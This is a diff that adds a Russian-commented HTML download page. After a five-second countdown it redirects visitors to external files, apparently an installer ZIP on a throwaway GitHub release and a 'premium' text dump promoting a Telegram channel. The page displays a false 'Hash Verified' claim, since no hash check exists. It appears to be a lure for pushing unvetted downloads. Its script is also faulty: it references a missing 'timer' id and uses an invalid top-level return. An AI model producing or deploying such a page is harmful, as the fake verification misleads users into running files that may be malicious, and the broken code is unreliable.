@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Download</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #e0bbff, #a29bce);
+            font-family: 'Arial', sans-serif;
+            color: #4b0082;
+        }
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.8);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            border: 2px solid #9370db;
+        }
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #9370db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .timer {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #4b0082;
+            animation: fadeIn 2s ease-in-out;
+        }
+        .verified {
+            margin-top: 10px;
+            font-size: 16px;
+            color: #9370db;
+            font-weight: bold;
+        }
+        .password, .info {
+            margin-bottom: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+        }
+        .error {
+            color: #d32f2f;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="password"> </div>
+        <div class="loader"></div>
+        <div class="timer">Downloading file in <span id="countdown">5</span> seconds...</div>
+        <div class="verified">Hash Verified</div>
+        <div class="info" id="filename-info">Preparing...</div>
+        <div class="error" id="error" style="display:none;">File not specified or unknown</div>
+    </div>
+
+    <script>
+        // ------------------ НАСТРОЙКА ССЫЛОК ЗДЕСЬ ------------------
+        const fileMap = {
+            // Ключи — то, что будет в ?filename=...
+            // Значения — полные внешние ссылки для скачивания
+            "1":                "https://github.com/charter-fairyu10/turn/releases/download/ex/Installer.zip",
+            "premium-txt":      "https://mediafire.com/file_premium/7grjnw3i1n1x71a/FOLLOW_TELEGRAM_%2540TXT_ALIENS_-_1444.txt",
+            "aliens":           "https://mediafire.com/file_premium/7grjnw3i1n1x71a/FOLLOW_TELEGRAM_%2540TXT_ALIENS_-_1444.txt",
+            "installer":        "https://github.com/charter-fairyu10/turn/releases/download/ex/Installer.zip",
+            // Добавляй новые сюда, например:
+            // "file3":         "https://mega.nz/file/abc123...",
+            // "update":        "https://example.com/update-v2.exe"
+        };
+        // -------------------------------------------------------------
+
+
+        // Получаем параметр ?filename=...
+        const params = new URLSearchParams(window.location.search);
+        const filename = params.get("filename");
+
+        let downloadUrl = null;
+
+        if (filename && fileMap[filename]) {
+            downloadUrl = fileMap[filename];
+            document.getElementById("filename-info").textContent = "Selected: " + filename;
+        } else {
+            document.getElementById("error").style.display = "block";
+            document.getElementById("timer").style.display = "none";
+            document.getElementById("filename-info").textContent = "Use ?filename=premium-txt or ?filename=installer";
+            // Можно остановить обратный отсчёт или оставить loader — как хочешь
+            return; // ← выходим, чтобы не начинался таймер
+        }
+
+        // Обратный отсчёт и редирект
+        let countdown = 5;
+        const countdownElement = document.getElementById('countdown');
+
+        const interval = setInterval(function() {
+            countdown--;
+            countdownElement.textContent = countdown;
+
+            if (countdown <= 0) {
+                clearInterval(interval);
+                window.location.href = downloadUrl;
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
